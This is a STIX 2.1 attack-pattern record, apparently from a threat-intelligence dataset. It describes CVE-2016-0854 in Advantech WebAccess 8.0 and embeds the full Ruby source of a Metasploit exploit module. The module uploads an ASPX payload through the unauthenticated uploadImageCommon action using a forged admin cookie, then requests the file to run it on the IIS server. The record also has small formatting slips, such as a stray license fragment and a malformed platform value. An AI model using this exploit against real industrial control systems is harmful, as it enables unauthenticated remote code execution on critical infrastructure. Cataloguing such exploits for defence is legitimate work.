{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c9f46590-bcc2-4acf-b82e-e8051be72768",
    "created": "2024-08-14T16:39:28.187577Z",
    "modified": "2024-08-14T16:39:28.187581Z",
    "name": "\"Advantech WebAccess Dashboard Viewer uploadImageCommon Arbitrary File Upload\"",
    "description": " This module exploits an arbitrary file upload vulnerability found in Advantech WebAccess 8.0.  This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Advantech WebAccess. Authentication is not required to exploit this vulnerability.  The specific flaw exists within the WebAccess Dashboard Viewer. Insufficient validation within the uploadImageCommon function in the UploadAjaxAction script allows unauthenticated callers to upload arbitrary code (instead of an image) to the server, which will then be executed under the high-privilege context of the IIS AppPool.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/advantech_webaccess_dashboard_file_upload.rb",
            "external_id": "advantech_webaccess_dashboard_file_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-0854"
        },
        {
            "source_name": "reference",
            "url": "https://ics-cert.us-cert.gov/advisories/ICSA-16-014-01"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => \"Advantech WebAccess Dashboard Viewer uploadImageCommon Arbitrary File Upload\",\n      'Description'    => %q{\n         This module exploits an arbitrary file upload vulnerability found in Advantech WebAccess 8.0.\n\n         This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations\n         of Advantech WebAccess. Authentication is not required to exploit this vulnerability.\n\n         The specific flaw exists within the WebAccess Dashboard Viewer. Insufficient validation within\n         the uploadImageCommon function in the UploadAjaxAction script allows unauthenticated callers to\n         upload arbitrary code (instead of an image) to the server, which will then be executed under the\n         high-privilege context of the IIS AppPool.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [\n        'rgod', # Vulnerability discovery\n        'Zhou Yu <504137480[at]qq.com>', # MSF module\n        'sinn3r' # Explicit check && better support of 8.0 (2014 and 2015)\n      ],\n      'References'     => [\n        [ 'CVE', '2016-0854' ],\n        [ 'ZDI', '16-128' ],\n        [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-16-014-01']\n      ],\n      'Platform'      => 'win',\n      'Targets'       => [\n        ['Advantech WebAccess 8.0', {}]\n      ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2016-02-05',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [true, 'The base path of Advantech WebAccess 8.0', '/'])\n      ])\n  end\n\n  def print_status(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def vuln_version?\n    uri = normalize_uri(target_uri, 'WADashboard', 'ajax', 'UploadAjaxAction.aspx')\n\n    data = Rex::MIME::Message.new\n    # If we can access the uploadImageCommon action name, that indicates the server is vulnerable\n    # to our attack. The \"patched\" version requires authentication, so we don't have access to\n    # the action name.\n    data.add_part('uploadImageCommon', nil, nil, 'form-data; name=\"actionName\"')\n\n    res = send_request_cgi(\n      'method'  => 'POST',\n      'uri'     => uri,\n      'cookie'  => \"waUserName=admin\",\n      'ctype'   => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'    => data.to_s\n    )\n\n    res = res.get_json_document\n    res['resStatus'] && res['resStatus'] == '1'\n  end\n\n  def check\n    if vuln_version?\n      Exploit::CheckCode::Vulnerable\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def upload_file?(filename, file)\n    print_status(\"Uploading: #{filename}\")\n    uri = normalize_uri(target_uri, 'WADashboard', 'ajax', 'UploadAjaxAction.aspx')\n\n    data = Rex::MIME::Message.new\n    data.add_part('uploadImageCommon', nil, nil, 'form-data; name=\"actionName\"')\n    data.add_part(file, nil, nil, \"form-data; name=\\\"file\\\"; filename=\\\"#{filename}\\\"\")\n\n    res = send_request_cgi(\n      'method'  => 'POST',\n      'uri'     => uri,\n      'cookie'  => \"waUserName=admin\",\n      'ctype'   => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'    => data.to_s\n    )\n\n    if res.get_json_document.empty?\n      false\n    else\n      # Only register when we know the upload was successful.\n      #\n      # When we get a session, we start at:\n      # c:\\windows\\system32\\inetsrv\n      # But our malicious file is at C:\\Inetpub\\wwwroot\\broadweb\\WADashboard\n      register_file_for_cleanup(\"../../../Inetpub/wwwroot/broadweb/WADashboard/#{filename}\")\n\n      true\n    end\n  end\n\n  def exec_file?(filename)\n    uri = normalize_uri(target_uri)\n    res = send_request_cgi(\n      'method'  => 'GET',\n      'uri'     => uri\n    )\n\n    uri = normalize_uri(target_uri, 'WADashboard', filename)\n    res = send_request_cgi(\n      'method'   => 'GET',\n      'uri'      => uri,\n      'cookie'   => res.get_cookies\n    )\n    res && res.code == 200\n  end\n\n  def exploit\n    unless vuln_version?\n      print_status('Target is not vulnerable.')\n      return\n    end\n\n    filename = \"#{Rex::Text.rand_text_alpha(5)}.aspx\"\n    filedata = Msf::Util::EXE.to_exe_aspx(generate_payload_exe)\n\n    print_status(\"#{peer} - Uploading malicious file...\")\n    return unless upload_file?(filename, filedata)\n\n    print_status(\"#{peer} - Executing #{filename}...\")\n    return unless exec_file?(filename)\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-02-05",
    "x_mitre_platforms": [
        "win'"
    ]
}